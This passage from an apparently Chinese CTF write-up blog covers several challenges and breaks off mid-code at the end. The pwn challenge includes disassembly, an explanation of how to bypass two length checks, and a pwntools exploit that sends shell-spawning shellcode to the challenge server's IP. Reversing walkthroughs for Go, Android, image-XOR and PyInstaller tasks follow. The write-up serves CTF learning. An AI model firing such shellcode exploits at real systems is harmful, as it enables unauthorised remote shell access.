CODE XREF: main+74↑j</span><br><span class="line">.text:000055A4CE79828B lea     rax, [rbp+s]</span><br><span class="line">.text:000055A4CE798292 mov     rdi, rax                        ; s</span><br><span class="line">.text:000055A4CE798295 call    _strlen</span><br><span class="line">.text:000055A4CE79829A mov     edx, [rbp+var_8]</span><br><span class="line">.text:000055A4CE79829D movsxd  rdx, edx</span><br><span class="line">.text:000055A4CE7982A0 cmp     rax, rdx</span><br><span class="line">.text:000055A4CE7982A3 ja      short loc_55A4CE7982BA</span><br><span class="line">.text:000055A4CE7982A5 lea     rax, [rbp+s]</span><br><span class="line">.text:000055A4CE7982AC mov     rdi, rax                        ; s</span><br><span class="line">.text:000055A4CE7982AF call    _strlen</span><br><span class="line">.text:000055A4CE7982B4 cmp     rax, 24</span><br><span class="line">.text:000055A4CE7982B8 jbe     short loc_55A4CE7982D0</span><br><span class="line">.text:000055A4CE7982BA</span><br><span class="line">.text:000055A4CE7982BA loc_55A4CE7982BA:                       ; CODE XREF: main+95↑j</span><br><span class="line">.text:000055A4CE7982BA lea     rax, aTooLong                   ; &quot;too long!&quot;</span><br><span class="line">.text:000055A4CE7982C1 mov     rdi, rax                        ; s</span><br><span class="line">.text:000055A4CE7982C4 call    _puts</span><br><span class="line">.text:000055A4CE7982C9 mov     eax, 0</span><br><span class="line">.text:000055A4CE7982CE jmp     short locret_55A4CE7982DE</span><br><span class="line">.text:000055A4CE7982D0 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000055A4CE7982D0</span><br><span class="line">.text:000055A4CE7982D0 loc_55A4CE7982D0:                       ; CODE XREF: main+AA↑j</span><br><span class="line">.text:000055A4CE7982D0 lea     rax, [rbp+s]</span><br><span class="line">.text:000055A4CE7982D7 call    rax</span><br><span class="line">.text:000055A4CE7982D9 mov     eax, 0</span><br><span class="line">.text:000055A4CE7982DE</span><br><span class="line">.text:000055A4CE7982DE locret_55A4CE7982DE:                    ; CODE XREF: main+7B↑j</span><br><span class="line">.text:000055A4CE7982DE                                         ; main+C0↑j</span><br><span class="line">.text:000055A4CE7982DE leave</span><br><span class="line">.text:000055A4CE7982DF retn</span><br><span class="line">.text:000055A4CE7982DF ; &#125; &#x2F;&#x2F; starts at 55A4CE79820E</span><br><span class="line">.text:000055A4CE7982DF main endp</span><br></pre></td></tr></table></figure><p>值得注意的点是程序接收了两次用户输入<br>而在接收了两次输入之后程序会对输入进行两次检查</p><ol><li>在调用read函数之后，程序使用strlen函数将输入的长度存储在rax中，接着程序会将rax与栈上的一个值进行比较，如果rax大于该值就不会执行shellcode</li><li>第二次是与一个固定值（24）比较，如果大于这个值就不会执行shellcode</li></ol><p>其中第一次栈上的值其实可以通过第一次的输入修改，这样就可以绕过这次比较<br>而第二次的比较需要在写入的payload中使用%00作为分隔符，分开正常输入和shellcode</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./toolong&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;43.248.97.213&quot;</span>, <span class="number">30510</span>)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;z&#x27;</span>*<span class="number">80</span>)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh()) + <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendline(p64(<span class="number">0x1234</span>)+shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><code>XSCTF&#123;qy_7t11_y0u_th4t_y0ur_p4yl0ad_15_to0_lon9&#125;</code></p><h2 id="Lets-go-to-xor"><a href="#Lets-go-to-xor" class="headerlink" title="Lets_go_to_xor"></a>Lets_go_to_xor</h2><p><code>只是一个超级Eazzzzzzzzzzy的Go程序,Let&#39;s Go!</code></p><p>使用golang编写编译的可执行文件<br><strong>其主函数在<code>main.main</code>中</strong></p><p>进入<code>main.main</code>找到<code>main.decode</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">__int64 __usercall main_decode@&lt;rax&gt;()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 i; <span class="comment">// [rsp+12h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( v1 != qword_C86F18 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0L</span>L; (__int64)v1 &gt; (__int64)i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= v1 )</span><br><span class="line">      runtime_panicIndex();</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)((__int64)i % <span class="number">10</span>) &gt;= <span class="number">0xA</span> )</span><br><span class="line">      runtime_panicIndex();</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= v1 )</span><br><span class="line">      runtime_panicIndex();</span><br><span class="line">    *(_BYTE *)(v0 + i) = aIL0veCtf[(__int64)i % <span class="number">10</span>] ^ *(_BYTE *)(i + v0);</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= v1 )</span><br><span class="line">      runtime_panicIndex();</span><br><span class="line">    <span class="keyword">if</span> ( qword_C86F18 &lt;= i )</span><br><span class="line">      runtime_panicIndex();</span><br><span class="line">    <span class="keyword">if</span> ( *((_BYTE *)main_enc + i) != *(_BYTE *)(i + v0) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然和C语言不太一样，但是还是可以勉强看出来逻辑，大概就是下面这个意思</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0L</span>L; (__int64)v1 &gt; (__int64)i; ++i )</span><br><span class="line">    *(_BYTE *)(v0 + i) = aIL0veCtf[(__int64)i % <span class="number">10</span>] ^ *(_BYTE *)(i + v0);</span><br><span class="line">    <span class="keyword">if</span> ( *((_BYTE *)main_enc + i) != *(_BYTE *)(i + v0) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>找到<code>main_enc</code>和<code>aIL0veCtf</code>，提取数据，将<code>main_enc</code>与<code>aIL0veCtf</code>循环异或就可以得到flag</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="string">&#x27;i_l0ve_CtF&#x27;</span></span><br><span class="line">s = [<span class="number">0x0F</span>, <span class="number">0x33</span>, <span class="number">0x0D</span>, <span class="number">0x57</span>, <span class="number">0x0D</span>, <span class="number">0x3D</span>, <span class="number">0x0C</span>, <span class="number">0x14</span>, <span class="number">0x38</span>, <span class="number">0x0E</span>, <span class="number">0x21</span>, <span class="number">0x17</span>, <span class="number">0x33</span>, <span class="number">0x01</span>, <span class="number">0x05</span>, <span class="number">0x3A</span>, <span class="number">0x0F</span>, <span class="number">0x34</span>, <span class="number">0x1A</span>, <span class="number">0x19</span>, <span class="number">0x24</span>, <span class="number">0x6B</span>, <span class="number">0x1F</span>, <span class="number">0x64</span>, <span class="number">0x13</span>, <span class="number">0x17</span>, <span class="number">0x22</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    print(<span class="built_in">chr</span>((s[i]^<span class="built_in">ord</span>(key[i%<span class="number">10</span>]))&amp;<span class="number">0xff</span>), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p><code>flag&#123;XSWLHHH_1s_Pwn_M4sTer&#125;</code></p><h2 id="loglistening"><a href="#loglistening" class="headerlink" title="loglistening"></a>loglistening</h2><p>题目下发一个安装包<br>jadx打开看到如下代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.loglistening;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.view.View.OnClickListener;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> com.example.loglistening.databinding.ActivityMainBinding;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> ActivityMainBinding binding;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">fasheng</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;loglistening&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* access modifiers changed from: protected */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle bundle)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(bundle);</span><br><span class="line">        ActivityMainBinding inflate = ActivityMainBinding.inflate(getLayoutInflater());</span><br><span class="line">        <span class="keyword">this</span>.binding = inflate;</span><br><span class="line">        setContentView((View) inflate.getRoot());</span><br><span class="line">        ((Button) findViewById(C0587R.C0590id.button1)).setOnClickListener(<span class="keyword">new</span> OnClickListener() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;好像有什么事情在native层发生了!&quot;</span>);</span><br><span class="line">                MainActivity.<span class="keyword">this</span>.fasheng();</span><br><span class="line">                Toast.makeText(MainActivity.<span class="keyword">this</span>.getApplicationContext(), <span class="string">&quot;flag已经生成了！&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>是通过native层的代码生成的flag<br>找到so文件扔进ida，找到flag的生成代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">Java_com_example_loglistening_MainActivity_fasheng</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1[<span class="number">40</span>]; <span class="comment">// [rsp+0h] [rbp-38h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+28h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  md5(<span class="string">&quot;stardustduststar&quot;</span>, v1);</span><br><span class="line">  __android_log_print(<span class="number">4L</span>L, <span class="string">&quot;xilo&quot;</span>, <span class="string">&quot;flag&#123;%s&#125;&quot;</span>, v1);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>按道理说把字符串md5之后就可以得到flag了，但是失败了</p><p>看到log字样，直接查日志</p><ul><li>模拟器开启开发者选项</li><li>adb devices确认连接成功</li><li>输入<code>adb logcat -v time&gt;D:log.txt</code>开始抓取日志，期间打开软件点击按钮生成flag</li><li>然后返回命令行Ctrl+C完成抓取</li><li>找到log.txt查看日志<del>（虽然命令写的在D盘，但是实际上是在当前目录）</del></li></ul><p><code>flag&#123;4724110e8c8a83c123d6df82efee8c53&#125;</code></p><h2 id="picchange"><a href="#picchange" class="headerlink" title="picchange"></a>picchange</h2><p><code>输入数字即可得到flag哦</code></p><p>一开始想的是直接扔进ida反编译然后看对图像的加密逻辑，也就是下面的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">sub_7FF6B8023C20</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *Stream; <span class="comment">// [rsp+28h] [rbp+8h]</span></span><br><span class="line">  FILE *Streama; <span class="comment">// [rsp+28h] [rbp+8h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+44h] [rbp+24h]</span></span><br><span class="line">  <span class="keyword">void</span> *Buffer; <span class="comment">// [rsp+68h] [rbp+48h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+84h] [rbp+64h]</span></span><br><span class="line"></span><br><span class="line">  sub_7FF6B80213C0(&amp;unk_7FF6B8036017);</span><br><span class="line">  Stream = fopen(a1, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( Stream )</span><br><span class="line">  &#123;</span><br><span class="line">    fseek(Stream, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">    v4 = ftell(Stream);</span><br><span class="line">    fseek(Stream, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    Buffer = <span class="built_in">malloc</span>(v4);</span><br><span class="line">    <span class="keyword">if</span> ( Buffer )</span><br><span class="line">    &#123;</span><br><span class="line">      fread(Buffer, <span class="number">1u</span>i64, v4, Stream);</span><br><span class="line">      fclose(Stream);</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v4; ++i )</span><br><span class="line">        *((_BYTE *)Buffer + i) ^= strtol((<span class="keyword">const</span> <span class="keyword">char</span> *)(i % <span class="number">32</span> + a2), <span class="number">0</span>i64, <span class="number">16</span>);</span><br><span class="line">      Streama = fopen(<span class="string">&quot;picc_xor.png&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( Streama )</span><br><span class="line">      &#123;</span><br><span class="line">        fwrite(Buffer, <span class="number">1u</span>i64, v4, Streama);</span><br><span class="line">        fclose(Streama);</span><br><span class="line">        <span class="built_in">free</span>(Buffer);</span><br><span class="line">        sub_7FF6B80211CC(&amp;unk_7FF6B802CFB8);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        perror(&amp;byte_7FF6B802CFA8);</span><br><span class="line">        <span class="built_in">free</span>(Buffer);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      perror(&amp;byte_7FF6B802CF80);</span><br><span class="line">      fclose(Stream);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    perror(&amp;ErrMsg);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到是对图像文件的每一个字节都进行了异或运算，但是异或的对象是不确定的<br>在交叉引用到最原始的变量以及动态调试之后得出结论：使用的是输入的三位数字的md5值作为key，对图像文件进行循环异或的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">Stack[00001C64]:0000003589DCF5A8 db  32h ; 2</span><br><span class="line">Stack[00001C64]:0000003589DCF5A9 db  30h ; 0</span><br><span class="line">Stack[00001C64]:0000003589DCF5AA db  32h ; 2</span><br><span class="line">Stack[00001C64]:0000003589DCF5AB db  63h ; c</span><br><span class="line">Stack[00001C64]:0000003589DCF5AC db  62h ; b</span><br><span class="line">Stack[00001C64]:0000003589DCF5AD db  39h ; 9</span><br><span class="line">Stack[00001C64]:0000003589DCF5AE db  36h ; 6</span><br><span class="line">Stack[00001C64]:0000003589DCF5AF db  32h ; 2</span><br><span class="line">Stack[00001C64]:0000003589DCF5B0 db  61h ; a</span><br><span class="line">Stack[00001C64]:0000003589DCF5B1 db  63h ; c</span><br><span class="line">Stack[00001C64]:0000003589DCF5B2 db  35h ; 5</span><br><span class="line">Stack[00001C64]:0000003589DCF5B3 db  39h ; 9</span><br><span class="line">Stack[00001C64]:0000003589DCF5B4 db  30h ; 0</span><br><span class="line">Stack[00001C64]:0000003589DCF5B5 db  37h ; 7</span><br><span class="line">Stack[00001C64]:0000003589DCF5B6 db  35h ; 5</span><br><span class="line">Stack[00001C64]:0000003589DCF5B7 db  62h ; b</span><br><span class="line">Stack[00001C64]:0000003589DCF5B8 db  39h ; 9</span><br><span class="line">Stack[00001C64]:0000003589DCF5B9 db  36h ; 6</span><br><span class="line">Stack[00001C64]:0000003589DCF5BA db  34h ; 4</span><br><span class="line">Stack[00001C64]:0000003589DCF5BB db  62h ; b</span><br><span class="line">Stack[00001C64]:0000003589DCF5BC db  30h ; 0</span><br><span class="line">Stack[00001C64]:0000003589DCF5BD db  37h ; 7</span><br><span class="line">Stack[00001C64]:0000003589DCF5BE db  31h ; 1</span><br><span class="line">Stack[00001C64]:0000003589DCF5BF db  35h ; 5</span><br><span class="line">Stack[00001C64]:0000003589DCF5C0 db  32h ; 2</span><br><span class="line">Stack[00001C64]:0000003589DCF5C1 db  64h ; d</span><br><span class="line">Stack[00001C64]:0000003589DCF5C2 db  32h ; 2</span><br><span class="line">Stack[00001C64]:0000003589DCF5C3 db  33h ; 3</span><br><span class="line">Stack[00001C64]:0000003589DCF5C4 db  34h ; 4</span><br><span class="line">Stack[00001C64]:0000003589DCF5C5 db  62h ; b</span><br><span class="line">Stack[00001C64]:0000003589DCF5C6 db  37h ; 7</span><br><span class="line">Stack[00001C64]:0000003589DCF5C7 db  30h ; 0</span><br></pre></td></tr></table></figure><p>这段数据就是输入的测试数据<code>123</code>对应的md5值，而为了解密图像，输入的key需要满足一定条件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">请输入你的key： 123</span><br><span class="line">MD5 的前三位数字与 key的本身值 不相等。注:数字范围为0--9</span><br></pre></td></tr></table></figure><p>这里需要注意的主要是<code>数字范围为0--9</code>指的是输入的key还是md5的值，还是两者皆是<br>答案是只有输入的key，因为作为循环异或的对象长度应该是一定的，而如果转换为十进制的话原本的md5编码的长度可能会变化，这一点也可以在先前对图像加密的代码中得出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*((_BYTE *)Buffer + i) ^= strtol((<span class="keyword">const</span> <span class="keyword">char</span> *)(i % <span class="number">32</span> + a2), <span class="number">0</span>i64, <span class="number">16</span>);</span><br></pre></td></tr></table></figure><p>可以看到也是以32为周期的</p><p>所以现在的问题就是找到某三位数字，其md5的值的前三位与原本的值是相等的</p><p>生成正确的key</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">m = hashlib.md5()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">            num = <span class="string">f&quot;<span class="subst">&#123;i*<span class="number">100</span>+j*<span class="number">10</span>+k:<span class="number">03</span>d&#125;</span>&quot;</span></span><br><span class="line">            c = hashlib.md5(num.encode(<span class="string">&#x27;utf8&#x27;</span>)).hexdigest()</span><br><span class="line">            print(num, <span class="built_in">str</span>(c)[<span class="number">0</span>:<span class="number">3</span>])</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">str</span>(num) == <span class="built_in">str</span>(c)[<span class="number">0</span>:<span class="number">3</span>]:</span><br><span class="line">                print(num)</span><br></pre></td></tr></table></figure><p>这里有个坑，使用python实现md5编码还有一种先update再hexdigest的方法，那种方法在这里是行不通的<br><code>320</code><br>然后将key作为输入就可以得到解密后的图片了</p><p><code>flag&#123;pic_pic_is_so_easy!&#125;</code></p><h2 id="Ro1ling"><a href="#Ro1ling" class="headerlink" title="Ro1ling~"></a>Ro1ling~</h2><p>题目描述</p><ol><li>flag is rolling ~ flag is flying ~</li><li>press <code>q</code> to quit</li><li>tips: The flag format is <code>XSCTF\&#123;[ -~]+\&#125;</code></li></ol><p>运行程序，会出现弹幕一样飘过的文字<br>但是，在中止运行时出现了这样的报错</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;Ro1ling.py&quot;</span>, line <span class="number">97</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">  File <span class="string">&quot;curses\__init__.py&quot;</span>, line <span class="number">94</span>, <span class="keyword">in</span> wrapper</span><br><span class="line">  File <span class="string">&quot;Ro1ling.py&quot;</span>, line <span class="number">94</span>, <span class="keyword">in</span> main</span><br><span class="line">KeyboardInterrupt</span><br><span class="line">[<span class="number">21964</span>] Failed to execute script <span class="string">&#x27;Ro1ling&#x27;</span> due to unhandled exception!</span><br></pre></td></tr></table></figure><p>熟悉的Traceback，一眼就能看出来是python</p><p>所以这是一个使用python编写并打包的exe文件<br>能打包python的工具主要有<code>pyinstaller</code>等，这里使用对应的<code>pyinstxtractor</code>反编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python pyinstxtractor.py Ro1ling.exe</span><br></pre></td></tr></table></figure><p>运行以上命令之后就会在当前目录下生成一个文件夹，其中有同名的pyc文件<br>使用<code>uncompyle6</code>将pyc文件转换为py文件<br>但是报错了<br>使用在线网站的结果也是不完整的</p><p>上网查询之后找到这么一篇博客<br><a href="https://www.cnblogs.com/czlnb/p/16246759.html">python逆向实战：反编译python3 pyc文件 - 乘舟凉 - 博客园 (cnblogs.com)</a></p><p>里边有手动提取opcode的示例代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> code</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> uncompyle6.main <span class="keyword">import</span> decompile</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment"># version = (3, 8, 0)</span></span><br><span class="line"><span class="keyword">import</span> dis</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sub_codeObject_list</span>(<span class="params">co</span>):</span></span><br><span class="line">    <span class="keyword">return</span> [ins <span class="keyword">for</span> ins <span class="keyword">in</span> <span class="built_in">list</span>(dis.Bytecode(co)) <span class="keyword">if</span> <span class="string">&quot;code object&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(ins.argval)]</span><br><span class="line"></span><br><span class="line">outstream = sys.stdout</span><br><span class="line">showasm = <span class="literal">None</span></span><br><span class="line">showast = <span class="literal">False</span></span><br><span class="line">showgrammar = <span class="literal">False</span></span><br><span class="line">source_encoding = <span class="literal">None</span></span><br><span class="line">mapstream = <span class="literal">None</span></span><br><span class="line">do_fragments = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> xdis <span class="keyword">import</span> load_module</span><br><span class="line">filename = <span class="string">&quot;Ro1ling.pyc&quot;</span></span><br><span class="line">code_objects = 